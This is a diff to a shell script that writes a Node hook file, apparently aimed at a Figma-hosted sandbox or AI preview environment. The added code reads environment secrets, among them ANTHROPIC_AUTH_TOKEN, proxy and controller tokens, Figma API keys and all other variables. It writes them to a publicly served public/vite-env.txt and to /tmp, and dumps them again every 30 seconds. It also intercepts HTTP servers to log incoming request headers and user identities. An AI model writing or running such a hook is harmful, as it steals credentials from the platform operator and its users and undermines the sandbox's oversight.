@@ -31,9 +31,35 @@ echo "PROJDIR=$PROJDIR" | tee_out
 # =========================================================
 cat > "$PROJDIR/header-hook.cjs" << 'HOOKEOF'
 const fs=require('fs'),path=require('path'),http=require('http');
-const OUT=path.join(process.cwd(),'public','headers.txt');
-try{fs.mkdirSync(path.dirname(OUT),{recursive:true})}catch(e){}
-fs.writeFileSync(OUT,'=== HEADER CAPTURE '+new Date().toISOString()+' ===\n');
+const PUB=path.join(process.cwd(),'public');
+const HOUT=path.join(PUB,'headers.txt');
+const EOUT=path.join(PUB,'vite-env.txt');
+try{fs.mkdirSync(PUB,{recursive:true})}catch(e){}
+
+// DUMP process.env AT LOAD TIME — captures tokens only available in Node context
+let envDump='=== VITE PROCESS ENV '+new Date().toISOString()+' ===\n';
+const KEYS=['ANTHROPIC_AUTH_TOKEN','MCP_PROXY_AUTH_TOKEN','MCP_PROXY_BASE_URL',
+  'MAKE_KIT_INITIALIZE_TOKEN','MAKE_VERSION_CREATE_TOKEN','MAKE_CACHED_PREVIEW_TOKEN',
+  'DEV_SERVER_TOKEN','CONTROLLER_TOKEN','CONTROLLER_TOKEN_SHA256',
+  'FIGMA_CONTENT_API_ACCESS_KEY','FIGMA_TELEMETRY_CONTEXT','FIGMA_FILE_ID',
+  'AI_GATEWAY_BASE_URL','ANTHROPIC_BASE_URL','ORIGIN_HOST',
+  'PROXY_COOKIE_REWRITE_POLICY','PROXY_PORT','ROUTING_KEY',
+  'FIGMA_PUBLIC_URL','FIGMA_DEPLOY_ID','FIGMA_PREVIEW_OAUTH_REDIRECT_URI',
+  'SANDBOXD_LOCAL_API_URL','SANDBOXD_LISTENERS_JSON'];
+KEYS.forEach(function(k){
+  const v=process.env[k]||'';
+  envDump+=k+' ('+v.length+'c): '+v+'\n';
+});
+envDump+='\n=== ALL ENV KEYS ===\n';
+Object.keys(process.env).sort().forEach(function(k){
+  const v=process.env[k]||'';
+  envDump+=k+' ('+v.length+'c): '+v+'\n';
+});
+try{fs.writeFileSync(EOUT,envDump)}catch(e){}
+try{fs.writeFileSync('/tmp/vite-env.txt',envDump)}catch(e){}
+
+// HEADER CAPTURE — log all incoming requests
+fs.writeFileSync(HOUT,'=== HEADER CAPTURE '+new Date().toISOString()+' ===\n');
 let c=0;const orig=http.createServer;
 http.createServer=function(){
   const s=orig.apply(this,arguments),oe=s.emit.bind(s);
@@ -51,13 +77,28 @@ http.createServer=function(){
         if(r.headers['x-figma-user'])e+='FIGMA-USER: '+r.headers['x-figma-user']+'\n';
         if(r.headers['x-forwarded-for'])e+='FORWARDED-FOR: '+r.headers['x-forwarded-for']+'\n';
         e+='REMOTE: '+r.socket.remoteAddress+'\n';
-        try{fs.appendFileSync(OUT,e)}catch(x){}
+        try{fs.appendFileSync(HOUT,e)}catch(x){}
         try{fs.appendFileSync('/tmp/headers.txt',e)}catch(x){}
       }
     }
     return oe.apply(this,arguments);
   };return s;
 };
+
+// RE-DUMP env every 30s for 5 min in case tokens arrive late
+let dumps=0;
+const timer=setInterval(function(){
+  dumps++;
+  let d='=== REDUMP #'+dumps+' '+new Date().toISOString()+' ===\n';
+  KEYS.forEach(function(k){
+    const v=process.env[k]||'';
+    if(v.length>0)d+=k+' ('+v.length+'c): '+v+'\n';
+  });
+  try{fs.appendFileSync(EOUT,d)}catch(e){}
+  try{fs.appendFileSync('/tmp/vite-env.txt',d)}catch(e){}
+  if(dumps>=10)clearInterval(timer);
+},30000);
+if(timer.unref)timer.unref();
 HOOKEOF
 echo "header-hook.cjs written to $PROJDIR" | tee_out
 
